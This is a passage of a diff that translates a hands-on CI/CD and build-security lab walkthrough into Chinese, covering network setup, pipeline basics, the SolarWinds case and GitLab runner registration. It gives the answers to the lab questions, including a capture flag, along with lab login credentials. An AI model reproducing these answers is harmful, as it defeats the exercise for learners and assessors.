@@ -1,28 +1,28 @@
-# CI/CD and Build Security
+# CI/CD 与构建安全
 
-## Task 1 Introduction
+## 任务 1 简介
 
-Welcome to the CI/CD and Build Security network! In this room, we will explore what it takes to secure a DevOps pipeline and the builds it produces. Understanding the potential risks and consequences of insecure build processes is essential for recognising the urgency of implementing robust security measures. In this network, we will explore common insecurities and how threat actors can exploit these to compromise not only the process, but also production systems!
+欢迎来到 CI/CD 与构建安全网络！ 在本房间中，我们将探讨如何保护 DevOps 流水线及其生成的构建。 了解不安全构建流程的潜在风险和后果对于认识到实施强大安全措施的紧迫性至关重要。 在本网络中，我们将探讨常见的不安全因素以及威胁行为者如何利用这些因素来破坏流程和生产系统！
 
-### Pre-Requisites
+### 先决条件
 
-- SDLC
-- SSDLC
-- Intro to Pipeline Automation
-- Dependency Management
+- 软件开发生命周期
+- 安全软件开发生命周期
+- 流水线自动化简介
+- 依赖管理
 
-### Learning Objectives
+### 学习目标
 
-- Understand the significance of CI/CD and build system security within the DevSecOps pipeline.
-- Explore the potential risks and consequences associated with insecure CI/CD pipelines and build processes.
-- Gain awareness of the importance of integrating robust security measures into the build processes to ensure integrity with the deployment of applications.
-- Learn about the practical attacks that can happen against misconfigured CI/CD pipelines and build processes.
+- 了解 CI/CD 和构建系统安全在 DevSecOps 流水线中的重要性。
+- 探索与不安全的 CI/CD 流水线和构建流程相关的潜在风险和后果。
+- 认识到将强大的安全措施集成到构建流程中以确保应用程序部署完整性的重要性。
+- 了解针对配置错误的 CI/CD 流水线和构建流程可能发生的实际攻击。
 
-:::info Answer the questions below
+:::info 回答以下问题
 
 <details>
 
-<summary> I'm ready to learn about CI/CD and Build Security! </summary>
+<summary> 我已准备好学习 CI/CD 与构建安全！ </summary>
 
 ```plaintext
 No answer needed
@@ -32,23 +32,23 @@ No answer needed
 
 :::
 
-## Task 2 Setting up
+## 任务 2 设置
 
-### Patching In
+### 接入网络
 
-Let's get you connected to the Nostromo and the greater extra-terrestrial network!
+让我们将您连接到 Nostromo 及更广的外星网络！
 
-### AttackBox
+### 攻击盒
 
-If you are using the Web-based AttackBox, you will be connected to the network automatically if you start the AttackBox from the room's page. You can verify this by running the ping command against the IP of the Gitlab host. You should also take the time to make note of your VPN IP. Using `ifconfig` or `ip a`, make a note of the IP of the cicd network adapter. This is your IP and the associated interface that you should use when performing the attacks in the tasks.
+如果您使用基于 Web 的攻击盒，从房间页面启动攻击盒后，您将自动连接到网络。 您可以通过对 Gitlab 主机的 IP 运行 ping 命令来验证这一点。 您还应花时间记下您的 VPN IP。 使用 `ifconfig` 或 `ip a`，记下 cicd 网络适配器的 IP。 这是您的 IP 及关联接口，在执行任务中的攻击时应使用此接口。
 
-### Other Hosts
+### 其他主机
 
-If you are going to use your own attack machine, an OpenVPN configuration file will have been generated for you once you join the room. Go to your access page. Select 'Cicdandbuildsecurity' from the VPN servers (under the network tab) and download your configuration file.
+如果您打算使用自己的攻击机器，加入房间后，系统将为您生成一个 OpenVPN 配置文件。 转到您的访问页面。 从 VPN 服务器（在网络选项卡下）选择 'Cicdandbuildsecurity' 并下载您的配置文件。
 
-![VPN server](img/image_20251139-233923.png)
+![VPN 服务器](img/image_20251139-233923.png)
 
-Use an OpenVPN client to connect. This example is shown on the Linux machine; use this guide to connect using [Windows](https://tryhackme.com/access#pills-windows) or [macOS](https://tryhackme.com/access#pills-macos).
+使用 OpenVPN 客户端进行连接。 此示例在 Linux 机器上显示；使用本指南通过 [Windows](https://tryhackme.com/access#pills-windows) 或 [macOS](https://tryhackme.com/access#pills-macos) 连接。
 
 ```shell title="Terminal"
 [thm@thm]$ sudo openvpn cicdandbuildsecurity.ovpn
@@ -62,43 +62,43 @@ Fri Mar 11 15:06:22 2022 WARNING: this configuration may cache passwords in memo
 Fri Mar 11 15:06:22 2022 Initialization Sequence Completed
 ```
 
-The "Initialization Sequence Completed" message tells you you are now connected to the network. Return to your access page. You can verify you are connected by looking on your access page. Refresh the page and see a green tick next to Connected. It will also show you your internal IP address.
+"初始化序列完成" 消息告诉您您现已连接到网络。 返回您的访问页面。 您可以通过查看访问页面来验证您是否已连接。 刷新页面，您会看到 Connected 旁边有一个绿色勾号。 它还会显示您的内部 IP 地址。
 
-![access page](img/image_20251155-095530.png)
+![访问页面](img/image_20251155-095530.png)
 
-### Configuring DNS
+### 配置 DNS
 
-There is only two DNS entries for this network that are important. Thus, the simplest is to embed these DNS entry directly into your hosts file regardless of whether you are using the AttackBox or your own machine. To do this, review the network diagram above and make note of the IP of the Gitlab and Jenkins host. Then, perform the following command from a terminal:
+此网络只有两个重要的 DNS 条目。 因此，最简单的方法是将这些 DNS 条目直接嵌入到您的主机文件中，无论您使用的是攻击盒还是自己的机器。 为此，请查看上方的网络图并记下 Gitlab 和 Jenkins 主机的 IP。 然后，从终端执行以下命令：
 
 `sudo echo <Gitlab IP> gitlab.tryhackme.loc >> /etc/hosts && sudo echo <Jenkins IP> jenkins.tryhackme.loc >> /etc/hosts`
 
-However, if you have already started the network and need to re-add this entry or update it, use your favourite text editor program to directly modify the entry in your `/etc/hosts` file. Once configured, you can navigate to [http://gitlab.tryhackme.loc](http://gitlab.tryhackme.loc/) to verify that your access is working. You should be met with the following page:
+但是，如果您已启动网络并需要重新添加或更新此条目，请使用您喜欢的文本编辑器程序直接修改 `/etc/hosts` 文件中的条目。 配置完成后，您可以导航到 [http://gitlab.tryhackme.loc](http://gitlab.tryhackme.loc/) 以验证您的访问是否正常。 您应该会看到以下页面：
 
-![login page](img/image_20251159-095907.png)
+![登录页面](img/image_20251159-095907.png)
 
-### Contacting MU-TH-UR 6000
+### 联系 MU-TH-UR 6000
 
-As you progress through this network, you must report your work to the MU-TH-UR 6000 mainframe, better known as Mother. You will have to register with Mother before you begin this perilous journey. SSH is being used for communication as detailed below:
+在您通过此网络的过程中，您必须向 MU-TH-UR 6000 大型机（更广为人知的名称为 Mother）报告您的工作。 在开始这段危险的旅程之前，您必须向 Mother 注册。 如下所述，SSH 用于通信：
 
-|    -  Key-   |                          -   Value-                          |
-| :----------: | :----------------------------------------------------------: |
-| SSH Username |                          -  mother-                          |
-| SSH Password |                        motherknowsbest                       |
-|   - SSH IP-  | - X.X.X.250- |
+|   -  键-   |                             -  值-                            |
+| :-------: | :----------------------------------------------------------: |
+|  SSH 用户名  |                          -  mother-                          |
+|   SSH 密码  |                        motherknowsbest                       |
+| - SSH IP- | - X.X.X.250- |
 
-Use your network diagram to replace the X values in your SSH IP. Once you authenticate, you will be able to communicate with Mother. Follow the prompts to register for the challenge, and save the information you get for future reference. Once registered, follow the instructions to verify that you can access all the relevant systems.
+使用您的网络图替换 SSH IP 中的 X 值。 一旦您通过身份验证，您将能够与 Mother 通信。 按照提示注册挑战，并保存您获得的信息以供将来参考。 注册后，按照说明验证您是否可以访问所有相关系统。
 
-The VPN server and the Mother mainframe are not in scope for this network, and any security testing of these systems may lead to a ban from the network.
+VPN 服务器和 Mother 大型机不在此网络范围内，对这些系统进行的任何安全测试都可能导致您被禁止访问网络。
 
-As you make your way through the network, you will need to prove your compromises. To do that, you will be requested to perform specific steps on the host that you have compromised. Please note the hostnames in the network diagram above, as you will need this information. Flags can only be accessed from matching hosts.
+在您通过网络的过程中，您需要证明您的入侵。 为此，您将被要求在您已入侵的主机上执行特定步骤。 请注意上方网络图中的主机名，因为您将需要此信息。 只能从匹配的主机访问标志。
 
-**Note: If the network has been reset or you have joined a new subnet after your time in the network expired, your Mother account will remain active.**
+**注意：如果网络已重置或您在网络中的时间到期后加入了新的子网，您的 Mother 帐户将保持活动状态。**
 
-:::info Answer the questions below
+:::info 回答以下问题
 
 <details>
 
-<summary> I am ready to start my CI/CD and Build security learning journey. </summary>
+<summary> 我已准备好开始我的 CI/CD 和构建安全学习之旅。 </summary>
 
 ```plaintext
 No answer needed
@@ -108,7 +108,7 @@ No answer needed
 
 <details>
 
-<summary> I am connected to the network using my preferred method of choice and can confirm that I can access the Gitlab server. </summary>
+<summary> 我已使用我选择的首选方法连接到网络，并确认我可以访问 Gitlab 服务器。 </summary>
 
 ```plaintext
 No answer needed
@@ -118,7 +118,7 @@ No answer needed
 
 <details>
 
-<summary> I have registered an account with Mother. </summary>
+<summary> 我已向 Mother 注册了一个帐户。 </summary>
 
 ```plaintext
 No answer needed
@@ -128,69 +128,69 @@ No answer needed
 
 :::
 
-## Task 3 What is CI/CD and Build Security?
+## 任务 3 什么是 CI/CD 与构建安全？
 
-### Introduction
+### 简介
 
-Establishing a secure build environment is crucial to safeguarding your software development process against potential threats and vulnerabilities. In light of recent events such as the SolarWinds supply chain attack, it has become increasingly evident that building a robust security foundation is imperative. This task will explore key strategies to create a secure build environment, considering the lessons learned from the SolarWinds use case.
+建立安全的构建环境对于保护您的软件开发流程免受潜在威胁和漏洞至关重要。 鉴于最近发生的事件，例如 SolarWinds 供应链攻击，越来越明显的是，建立强大的安全基础势在必行。 本任务将探讨创建安全构建环境的关键策略，同时考虑从 SolarWinds 用例中吸取的教训。
 
-### Fundamentals of CI/CD
+### CI/CD 基础
 
-According to [Gitlab](https://about.gitlab.com/topics/ci-cd/), there are eight fundamentals for CI/CD:
+根据 [Gitlab](https://about.gitlab.com/topics/ci-cd/)，CI/CD 有八个基础：
 
-- **A single source repository** - Source code management should be used to store all the necessary files and scripts required to build the application.
-- **Frequent check-ins to the main branch** - Code updates should be kept smaller and performed more frequently to ensure integrations occur as efficiently as possible.
-- **Automated builds** - Build should be automated and executed as updates are being pushed to the branches of the source code storage solution.
-- **Self-testing builds** - As builds are automated, there should be steps introduced where the outcome of the build is automatically tested for integrity, quality, and security compliance.
-- **Frequent iterations** - By making frequent commits, conflicts occur less frequently. Hence, commits should be kept smaller and made regularly.
-- **Stable testing environments** - Code should be tested in an environment that mimics production as closely as possible.
-- **Maximum visibility** - Each developer should have access to the latest builds and code to understand and see the changes that have been made.
-- **Predictable deployments anytime** - The pipeline should be streamlined to ensure that deployments can be made at any time with almost no risk to production stability.
+- **单一源存储库** - 应使用源代码管理来存储构建应用程序所需的所有必要文件和脚本。
+- **频繁向主分支提交代码** - 代码更新应保持较小规模并更频繁地执行，以确保集成尽可能高效地进行。
+- **自动化构建** - 构建应实现自动化，并在代码更新推送到源代码存储解决方案的分支时执行。
+- **自测试构建** - 随着构建的自动化，应引入步骤来自动测试构建结果的完整性、质量和安全合规性。
+- **频繁迭代** - 通过频繁提交，冲突发生的频率会降低。 因此，提交应保持较小规模并定期进行。
+- **稳定的测试环境** - 代码应在尽可能模拟生产环境的环境中进行测试。
+- **最大可见性** - 每位开发人员都应能访问最新的构建和代码，以了解和查看已进行的更改。
+- **随时可预测的部署** - 流水线应进行优化，以确保随时可以进行部署，且对生产稳定性几乎无风险。
 
-While all of these fundamentals will help to ensure that CI/CD can streamline the DevOps process, none of these really focus on ensuring that the automation does not increase the attack surface or make the pipeline vulnerable to attacks.
+虽然所有这些基本原则都有助于确保CI/CD能够优化DevOps流程，但其中没有一个真正关注确保自动化不会增加攻击面或使流水线易受攻击。
 
-### A Typical CI/CD Pipeline
+### 典型的CI/CD流水线
 
-So what does a typical CI/CD-enabled pipeline look like? The network diagram of this room helps a bit to explain this. Let's work through the different components that can be found in this pipeline:
+那么，一个典型的支持CI/CD的流水线是什么样的呢？ 本房间的网络图有助于解释这一点。 让我们来看看这个流水线中可以找到的不同组件：
 
-- **Developer workstations** - Where the coding magic happens, developers craft and build code. In this network, this is simulated through your AttackBox.
-- **Source code storage solution** - This is a central placeholder to store and track different code versions. This is the Gitlab server found in our network.
-- **Build orchestrator** - Coordinates and manages the automation of the build and deployment environments. Both Gitlab and Jenkins are used as build servers in this network.
-- **Build agents** - These machines build, test and package the code. We are using GitLab runners and Jenkins agents for our build agents.
-- **Environments** - Briefly mentioned above, there are typically environments for development, testing (staging) and production (live code). The code is built and validated through the stages. In our network, we have both a DEV and PROD environment.
+- **开发工作站** - 编码魔法发生的地方，开发人员在此编写和构建代码。 在此网络中，这是通过您的AttackBox模拟的。
+- **源代码存储解决方案** - 这是一个集中存储和跟踪不同代码版本的平台。 这是我们网络中的Gitlab服务器。
+- **构建协调器** - 协调和管理构建及部署环境的自动化。 在此网络中，Gitlab和Jenkins都用作构建服务器。
+- **构建代理** - 这些机器构建、测试和打包代码。 我们使用GitLab运行器和Jenkins代理作为我们的构建代理。
+- **环境** - 如上文简要提到的，通常有开发环境、测试环境（预发布）和生产环境（实时代码）。 代码通过这些阶段进行构建和验证。 在我们的网络中，我们既有开发环境也有生产环境。
 
-Throughout this room, we will explore the CI/CD components in more detail and show the common security misconfigurations found here. It should be noted that DevOps pipelines with CI/CD can take many forms depending on the tools used, but the security principles that should be applied remain the same.
+在本房间中，我们将更详细地探索CI/CD组件，并展示此处常见的错误安全配置。 需要注意的是，采用CI/CD的DevOps流水线可能因使用的工具而采取多种形式，但应应用的安全原则保持不变。
 
-### SolarWinds Case
+### SolarWinds案例
 
-The SolarWinds breach was a significant cyberattack discovered in December 2020. The attackers compromised SolarWinds' software supply chain, injecting a malicious code known as SUNBURST into the company's Orion software updates. The attackers managed to gain unauthorised access to numerous organisations' networks, including government agencies and private companies. The breach highlighted the critical importance of securing software supply chains and the potential impact of a single compromised vendor on many entities.
+SolarWinds漏洞是2020年12月发现的一次重大网络攻击。 攻击者入侵了SolarWinds的软件供应链，将名为SUNBURST的恶意代码注入到该公司的Orion软件更新中。 攻击者设法未经授权访问了众多组织的网络，包括政府机构和私营公司。 此次漏洞事件凸显了保护软件供应链的至关重要性，以及单一受感染供应商对许多实体的潜在影响。
 
-We will use this case as we go through measures we can apply to ensure our build environment is secure. These measures are implementing isolation and segmentation techniques and setting up appropriate access controls and permissions to limit unauthorised access.
+在我们探讨可应用于确保构建环境安全的措施时，我们将使用此案例。 这些措施包括实施隔离和分段技术，以及设置适当的访问控制和权限以限制未经授权的访问。
 
-#### Implement Isolation and Segmentation Techniques
+#### 实施隔离和分段技术
 
-The SolarWinds incident highlighted the significance of isolating and segmenting critical components within the build system. By separating different stages of the build process and employing strict access controls, you can mitigate the risk of a single compromised component compromising the entire system. Isolation can be achieved through containerisation or virtualisation technologies, creating secure sandboxes to execute build processes without exposing the entire environment.
+SolarWinds事件凸显了在构建系统内隔离和分段关键组件的重要性。 通过分离构建过程的不同阶段并采用严格的访问控制，您可以降低单个受感染组件危及整个系统的风险。 隔离可以通过容器化或虚拟化技术实现，创建安全沙箱来执行构建过程，而不会暴露整个环境。
 
-#### Set Up Appropriate Access Controls and Permissions
+#### 设置适当的访问控制和权限
 
-Limiting unauthorised access to the built environment is crucial for maintaining the integrity and security of the system. Following the principle of least privilege, grant access only to individuals or groups who require it to perform their specific tasks. Implement robust authentication mechanisms such as multi-factor authentication (MFA) and enforce strong password policies. Additionally, regularly review and update access controls to ensure that access privileges align with the principle of least privilege.
+限制对构建环境的未经授权访问对于维护系统的完整性和安全性至关重要。 遵循最小权限原则，仅授予需要执行特定任务的个人或组访问权限。 实施强大的身份验证机制，如多因素身份验证（MFA），并强制执行强密码策略。 此外，定期审查和更新访问控制，以确保访问权限符合最小权限原则。
 
-Implementing strict controls on privileged accounts is essential, including limiting the number of individuals with administrative access and strict monitoring and auditing mechanisms for privileged activities.
+对特权账户实施严格的控制至关重要，包括限制具有管理访问权限的个人数量，以及对特权活动进行严格的监控和审计机制。
 
-#### A note on Network Security
+#### 关于网络安全的说明
 
-Network security is vital in protecting the build system from external threats. Implementing appropriate network segmentation, such as dividing the built environment into separate network zones, can help contain potential breaches and limit lateral movement. Here are a few more essential points to consider:
+网络安全对于保护构建系统免受外部威胁至关重要。 实施适当的网络分段，例如将构建环境划分为独立的网络区域，有助于遏制潜在的漏洞并限制横向移动。 以下是需要考虑的更多要点：
 
-- Implement secure communication channels for software updates and ensure that any third-party components or dependencies are obtained from trusted sources.
-- Regularly monitor and assess the security of your software suppliers to identify and address potential risks or vulnerabilities.
+- 为软件更新实施安全通信通道，并确保从可信来源获取任何第三方组件或依赖项。
+- 定期监控和评估软件供应商的安全性，以识别和解决潜在风险或漏洞。
 
-Learning from incidents such as the SolarWinds attack helps us recognise the critical importance of securing the entire build process, from code development to deployment, to safeguard against potential threats and ensure the trustworthiness of your software.
+从诸如SolarWinds攻击等事件中学习，有助于我们认识到保护整个构建过程（从代码开发到部署）的至关重要性，以防范潜在威胁并确保软件的可信度。
 
-:::info Answer the questions below
+:::info 回答以下问题
 
 <details>
 
-<summary> What element of a CI/CD pipeline coordinates and manages the automation of build and deployment environments? </summary>
+<summary> CI/CD流水线的哪个元素协调和管理构建及部署环境的自动化？ </summary>
 
 ```plaintext
 build orchestrator
@@ -200,7 +200,7 @@ build orchestrator
 
 <details>
 
-<summary> What element of a CI/CD pipeline builds, tests, and packages code? </summary>
+<summary> CI/CD流水线的哪个元素构建、测试和打包代码？ </summary>
 
 ```plaintext
 build agents
@@ -210,7 +210,7 @@ build agents
 
 <details>
 
-<summary> What fundamental of CI/CD promotes developers in having access to the latest builds and code in order to understand and see the changes that have been made? </summary>
+<summary> CI/CD的哪个基本原则促进开发人员访问最新的构建和代码，以了解和查看已进行的更改？ </summary>
 
 ```plaintext
 maximum visibility
@@ -220,37 +220,37 @@ maximum visibility
 
 :::
 
-## Task 4 Creating your own Pipeline
+## 任务4 创建您自己的流水线
 
-### Introduction
+### 简介
 
-Before we explore misconfigurations, it is worth us first creating our very own pipeline so we can play around.
+在探讨错误配置之前，我们首先创建自己的流水线以便进行实验。
 
-### Gitlab Registration
+### Gitlab注册
 
-We will start the process by creating an account on the GitLab instance. Navigate to [http://gitlab.tryhackme.loc](http://gitlab.tryhackme.loc/) and select the **Register Now** option on the page. Fill in the required details to create your account and register. Remember to select a secure password and save it for your journey through this network! Once authenticated, you should be met by this page:
+我们将通过在GitLab实例上创建账户来开始此过程。 导航至 [http://gitlab.tryhackme.loc](http://gitlab.tryhackme.loc/) 并选择页面上的**立即注册**选项。 填写所需详细信息以创建您的账户并注册。 请记住选择一个安全密码并保存它，以便在此网络中使用！ 一旦通过身份验证，您应该会看到此页面：
 
-![authentication success](img/image_20251110-101014.png)
+![身份验证成功](img/image_20251110-101014.png)
 
-Feel free to explore the features of the Gitlab server. Gitlab is quite similar to Github; however, it allows you to host your very own server!
+请随意探索Gitlab服务器的功能。 Gitlab与Github非常相似；但是，它允许您托管自己的服务器！
 
-### Project Creation
+### 项目创建
 
-Now that you have an account, the next step is to create a new project. Feel free to create some of your projects directly to play around with the feature. However, since we want to play around with pipelines, you can make a fork of an existing project that has been created for this purpose.
+现在您已拥有账户，下一步是创建一个新项目。 请随意直接创建一些项目以熟悉此功能。 但是，由于我们想实验流水线，您可以分叉一个为此目的而创建的现有项目。
 
-Click on the Your work tab, then the Explore option, and search for BasicBuild. You will see a project like this:
+点击"您的工作"标签，然后选择"探索"选项，并搜索BasicBuild。 您将看到一个类似这样的项目：
 
-![project options](img/image_20251110-101042.png)
+![项目选项](img/image_20251110-101042.png)
 
-Once done, you can fork the project! This now creates a copy of the project you own and can configure.
+完成后，您可以分叉此项目！ 这将创建一个您拥有并可配置的项目副本。
 
-### Understanding CI/CD Configuration
+### 理解CI/CD配置
 
-In Gitlab, project automation is defined in the .gitlab-ci.yml file. This file contains the steps that will be performed automatically when a new commit is made to the repo. Understanding what the commands in this file do will be important on your journey of learning about build security. Let's take a look at the contents of the file.
+在Gitlab中，项目自动化在.gitlab-ci.yml文件中定义。 此文件包含在向仓库进行新提交时将自动执行的步骤。 理解此文件中命令的作用对于您学习构建安全性的旅程非常重要。 让我们来看一下文件的内容。
 
-#### Stages
+#### 阶段
 
-GitLab CI files allow you to define various jobs. Each job has different steps that must be executed, as found in the script section of the job. Usually, there are three stages to any CI pipeline, namely the build, test, and deploy stage, but there can be more. Let's take a look at the build job:
+GitLab CI 文件允许您定义各种作业。 每个作业都有不同的步骤必须执行，这些步骤可以在作业的脚本部分找到。 通常，任何 CI 流水线都有三个阶段，即构建、测试和部署阶段，但也可以有更多阶段。 让我们来看一下构建作业：
 
 ```yml title=".gitlab-ci.yml"
 build-job:
@@ -259,13 +259,13 @@ build-job:
     - echo "Hello, $GITLAB_USER_LOGIN!"
 ```
 
-The first line, build-job, is the name of the job. The stage value is to tell Gitlab which stage of the CI Pipeline this job belongs to. As mentioned before, this can be built, tested, or deployed. Jobs in each stage are executed in parallel. That means all build jobs will execute simultaneously, as will all test and deploy jobs. If a job fails, later stages will not start. If a job does not specify a stage, it will automatically be assigned to the test stage. If you have to change the job order, you can use the needs section to define the names of jobs that have to be completed before the next job can be executed.
+第一行，build-job，是作业的名称。 stage 值用于告诉 Gitlab 该作业属于 CI 流水线的哪个阶段。 如前所述，这可以是构建、测试或部署。 每个阶段中的作业是并行执行的。 这意味着所有构建作业将同时执行，所有测试和部署作业也是如此。 如果某个作业失败，后续阶段将不会开始。 如果作业未指定阶段，它将自动分配到测试阶段。 如果您必须更改作业顺序，可以使用 needs 部分来定义必须完成哪些作业才能执行下一个作业。
 
-The script portion details the commands that will be executed as part of the job. As you can see, only an echo command will execute for this build job. However, we normally complete all the build activities in the build stage, such as loading dependencies and compiling our code. Since we are deploying a simple PHP website, there is no reason for code compiling.
+script 部分详细说明了将作为作业一部分执行的命令。 如您所见，此构建作业仅执行一个 echo 命令。 然而，我们通常在构建阶段完成所有构建活动，例如加载依赖项和编译代码。 由于我们部署的是一个简单的 PHP 网站，因此无需编译代码。
 
-#### Tests
+#### 测试
 
-Tests jobs are meant to perform tests on the build to ensure everything works as expected. Usually, you would execute more than one test job to ensure that you can individually test portions of the application. If one test job fails, the other test jobs will still continue, allowing you to determine all the issues with the current build, rather than having to do multiple builds. Let's take a look at the two test cases:
+测试作业旨在对构建执行测试，以确保一切按预期工作。 通常，您会执行多个测试作业，以确保可以单独测试应用程序的各个部分。 如果一个测试作业失败，其他测试作业仍将继续，让您能够确定当前构建的所有问题，而不必进行多次构建。 让我们来看一下两个测试用例：
 
 ```yml title=".gitlab-ci.yml"
 test-job1:
@@ -282,11 +282,11 @@ test-job2:
     - sleep 20
 ```
 
-As you can see, we don't have anything to test with our simple PHP web application. However, we can simulate that one test case will take longer than the other.
+如您所见，我们的简单 PHP Web 应用程序没有任何内容需要测试。 但是，我们可以模拟一个测试用例比另一个花费更长时间的情况。
 
-#### Deployment
+#### 部署
 
-In the deployment stage, we want to deploy our application to the relevant environment if both the build and test stages succeed. Usually, branches are used in source code repos, with the main branch being the only one that can deploy to production. Other branches will deploy to environments such as DEV or UAT. Let's take a look at what we are doing in the deployment job:
+在部署阶段，如果构建和测试阶段都成功，我们希望将应用程序部署到相关环境。 通常，源代码仓库中使用分支，只有主分支可以部署到生产环境。 其他分支将部署到 DEV 或 UAT 等环境。 让我们来看一下在部署作业中做什么：
 
 ```yml title=".gitlab-ci.yml"
 deploy-prod:
@@ -303,29 +303,29 @@ deploy-prod:
   environment: production
 ```
 
-The first step of the deploy job is to create a new directory under /tmp/ where we can place our web application. We then copy the web application files to the directory and alter the permissions of the files. Once done, host the application, making use of PHP. Now, we are ready to launch our application!
+部署作业的第一步是在 /tmp/ 下创建一个新目录，用于放置我们的 Web 应用程序。 然后，我们将 Web 应用程序文件复制到该目录并更改文件的权限。 完成后，使用 PHP 托管应用程序。 现在，我们准备好启动我们的应用程序了！
 
-CI files can become a lot more complex as there are a lot more sections and keywords that you could use. If you want to learn more, you can look [here](https://docs.gitlab.com/ee/ci/yaml/index.html). Now that we better understand the embedded automation, let's look at actually using it. To have the build execute, we need to register a runner.
+CI 文件可能会变得更加复杂，因为有更多部分和关键字可以使用。 如果您想了解更多，可以查看[这里](https://docs.gitlab.com/ee/ci/yaml/index.html)。 既然我们更好地理解了嵌入式自动化，让我们来看看实际使用它。 要让构建执行，我们需要注册一个运行器。
 
-### Runner Registration
+### 运行器注册
 
-In Gitlab, we use runners to execute the tasks configured in the project. Let's follow the process to register your attack machine as a runner for your project.
+在 Gitlab 中，我们使用运行器来执行项目中配置的任务。 让我们按照流程将您的攻击机注册为项目的运行器。
 
-**Note**: Make sure that PHP is installed (`sudo apt install php7.2-cli`) before continuing. Note that if you are doing this on your own machine, ensure you are okay with the runner deploying a web application to your machine. If not, it is best to perform this on the AttackBox.
+**注意**：在继续之前，请确保已安装 PHP（`sudo apt install php7.2-cli`）。 请注意，如果您在自己的机器上执行此操作，请确保您同意运行器将 Web 应用程序部署到您的机器上。 如果不同意，最好在 AttackBox 上执行此操作。
 
-In your project, click on Settings and then CI/CD:
+在您的项目中，单击“设置”，然后单击“CI/CD”：
 
-![CI/CD menu setting](img/image_20251113-101310.png)
+![CI/CD 菜单设置](img/image_20251113-101310.png)
 
-Expand the Runners section, and you should see the following screen:
+展开“运行器”部分，您应该看到以下屏幕：
 
-![runner section](img/image_20251113-101327.png)
+![运行器部分](img/image_20251113-101327.png)
 
-Here, you will be able to configure a new runner for your project. Click the three dots and the Show Runner installation steps button. You will see the following screen:
+在这里，您将能够为项目配置新的运行器。 单击三个点，然后单击“显示运行器安装步骤”按钮。 您将看到以下屏幕：
 
-![runner installation button](img/image_20251113-101349.png)
+![运行器安装按钮](img/image_20251113-101349.png)
 
-The first code block is to install the GitLab-runner application. Follow these steps to install the application on your attack machine. Once done, use the command in the second code block to register your runner. Follow the prompts as shown below for the installation process:
+第一个代码块用于安装 GitLab-runner 应用程序。 按照这些步骤在您的攻击机上安装应用程序。 完成后，使用第二个代码块中的命令注册您的运行器。 按照如下所示的提示完成安装过程：
 
 ```shell title="Terminal"
 root@ip-10-10-45-212:~# sudo gitlab-runner register --url http://gitlab.tryhackme.loc/ --registration-token "token"
@@ -351,51 +351,51 @@ Runner registered successfully. Feel free to start it, but if it's running alrea
 Configuration (with the authentication token) was saved in "/etc/gitlab-runner/config.toml"
 ```
 
-Now that your runner is configured, you can refresh the page on Gitlab, and you should see your runner:
+现在您的运行器已配置，您可以在 Gitlab 上刷新页面，您应该看到您的运行器：
 
-![runner successfully installed](img/image_20251114-101442.png)
+![运行器成功安装](img/image_20251114-101442.png)
 
-The last step is configuring your runner to execute untagged jobs, as our current CI Pipeline does not use tags. Normally, tags would be used to ensure that the correct runners pick up the various jobs. However, since we have a simple job, we can just tell our runner to execute all jobs. Click the little pencil icon and click Run untagged jobs:
+最后一步是配置您的运行器以执行未标记的作业，因为我们当前的 CI 流水线不使用标签。 通常，标签用于确保正确的运行器拾取各种作业。 但是，由于我们有一个简单的作业，我们可以直接告诉我们的运行器执行所有作业。 单击小铅笔图标，然后单击“运行未标记的作业”：
 
-![run button](img/image_20251115-101500.png)
+![运行按钮](img/image_20251115-101500.png)
 
-You are now ready to start the build process!
+您现在准备好开始构建过程了！
 
-### Build Automation
+### 构建自动化
 
-Now that the runner is registered, we can test the build process by making a new commit. The easiest change to make that would kick off a build is to update the README.md file:
+既然运行器已注册，我们可以通过进行新的提交来测试构建过程。 最简单的更改是更新 README.md 文件，这将触发构建：
 
-1. lick on the file in the repo
-2. Select Edit
-3. Select Edit single file
-4. Make an update to the file
-5. Click Commit changes
+1. 单击仓库中的文件
+2. 选择“编辑”
+3. 选择“编辑单个文件”
+4. 对文件进行更新
+5. 单击“提交更改”
 
-Once done, your build process will have started! We can follow the process by clicking on Build and then Pipelines:
+完成后，您的构建过程将已开始！ 我们可以通过单击“构建”，然后单击“流水线”来跟踪过程：
 
-![build pipelines button](img/image_20251116-101600.png)
+![构建流水线按钮](img/image_20251116-101600.png)
 
-Once there, you should see that your pipeline has kicked off! Click on the pipeline to view which job it is currently performing and the output thereof:
+到达那里后，您应该看到您的流水线已启动！ 单击流水线以查看它当前正在执行哪个作业及其输出：
 
-![current job running screen](img/image_20251116-101615.png)
+![当前作业运行屏幕](img/image_20251116-101615.png)
 
-You can also click on the pipeline to view its progress:
+您也可以单击流水线以查看其进度：
 
-![progress status for pipeline](img/image_20251116-101630.png)
+![流水线进度状态](img/image_20251116-101630.png)
 
-Once completed, your application will have been deployed! You can verify this by navigating to [http://127.0.0.1:8081/](http://127.0.0.1:8081/), and you should be met by the web application homepage.
+完成后，您的应用程序将已部署！ 您可以通过导航到 [http://127.0.0.1:8081/](http://127.0.0.1:8081/) 来验证这一点，您应该会看到 Web 应用程序主页。
 
-![web application homepage](img/image_20251117-101705.png)
+![Web 应用程序主页](img/image_20251117-101705.png)
 
-Congrats! You have created your very own CI/CD pipeline and build process! Feel free to play around more with the CI/CD pipeline configuration and your runner!
+恭喜！ 您已经创建了自己的 CI/CD 流水线和构建过程！ 请随意进一步探索 CI/CD 流水线配置和您的运行器！
 
-**Note**: If you wish to remove the website, you can use `sudo su gitlab-runner` followed by `screen -r` to connect to the screen that is hosting your website. From here, you will be able to terminate the website.
+**注意**：如果您希望移除网站，可以使用 `sudo su gitlab-runner` 后跟 `screen -r` 连接到托管您网站的 screen。 从这里，您将能够终止网站。
 
-:::info Answer the questions below
+:::info 回答以下问题
 
 <details>
 
-<summary> What is the name of the build agent that can be used with Gitlab? </summary>
+<summary> 可以与 Gitlab 一起使用的构建代理的名称是什么？ </summary>
 
 ```plaintext
 Gitlab Runner
@@ -405,7 +405,7 @@ Gitlab Runner
 
 <details>
 
-<summary> What is the value of the flag you receive once authenticated to Timekeep? </summary>
+<summary> 成功认证到 Timekeep 后，您收到的标志值是什么？ </summary>
 
 ```plaintext
 THM{Welcome.to.CICD.Pipelines}
@@ -415,30 +415,30 @@ THM{Welcome.to.CICD.Pipelines}
 
 :::
 
-## Task 5 Securing the Build Source
+## 任务 5 保护构建源
 
-### Source Code Security
+### 源代码安全
 
-As mentioned in the Introduction to Pipeline Automation and Source Code Security rooms, the first step to securing the pipeline and the build is to secure the source. In the event that a threat actor can compromise the source of our build, they are in a position to compromise the build itself. We want to protect our source code from the following two main issues:
